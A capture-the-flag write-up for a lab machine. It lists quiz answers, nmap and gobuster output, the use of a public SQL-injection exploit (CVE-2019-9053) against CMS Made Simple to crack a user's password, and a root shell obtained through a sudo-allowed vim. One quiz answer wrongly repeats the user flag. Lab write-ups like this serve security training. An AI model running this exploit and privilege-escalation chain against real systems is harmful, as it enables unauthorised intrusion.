export ip=10.10.146.35

```
How many services are running under port 1000?
2
```

```
What is running on the higher port?
ssh
```

```
What's the CVE you're using against the application?
CVE-2019-9053
```

```
To what kind of vulnerability is the application vulnerable?
sqli
```

```
What's the password?
secret
```

```
Where can you login with the details obtained?
ssh
```

``` 	
What's the user flag?
G00d j0b, keep up!
```

```
Is there any other user in the home directory? What's its name?
G00d j0b, keep up!
```

``` 	
What can you leverage to spawn a privileged shell?
vim
```

```
What's the root flag?
W3ll d0n3. You made it!
```

```
nmap scan
# Nmap 7.80 scan initiated Wed Jun 24 14:37:51 2020 as: nmap -sC -sV -oN nmap.txt 10.10.146.35
Nmap scan report for 10.10.146.35
Host is up (0.12s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.9.96
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 24 14:38:43 2020 -- 1 IP address (1 host up) scanned in 51.68 seconds
```
anon FTP login @ 21: pub/ForMitch.txt

```
$ cat ForMitch.txt: Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

```
gobuster scan
$ gobuster dir -u http://10.10.146.35 -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.146.35
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/24 14:40:59 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2020/06/24 14:41:38 Finished
===============================================================
```

```
gobuster http://10.10.146.35/simple/

$ gobuster dir -u http://10.10.146.35/simple -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.146.35/simple
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/24 14:45:21 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/assets (Status: 301)
/doc (Status: 301)
/index.php (Status: 200)
/lib (Status: 301)
/modules (Status: 301)
/tmp (Status: 301)
/uploads (Status: 301)
===============================================================
2020/06/24 14:45:58 Finished
===============================================================
```
```
CVE-2019-9053
https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html
https://www.exploit-db.com/exploits/46635
CMS Made Simple < 2.2.10 (2.2.8 in our case) - SQL Injection - exploits/php/webapps/46635.py
sql injection timing attack - CVE-2019-9053
```

```
$python3 exploit.py -u http://10.10.146.35/simple

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

$python3 exploit.py -u http://10.10.146.35/simple --crack -w best110.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret

;TL;DR had to modify line 56 of the cript because the hashlib string "line" was not utf8 encoded - https://stackoverflow.com/questions/27519306/hashlib-md5-typeerror-unicode-objects-must-be-encoded-before-hashing/27519440

```

```
ssh mitch@$ip -p 2222
Password:secret

$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

$ vim -c ':!/bin/bash'
!!! root !!!
```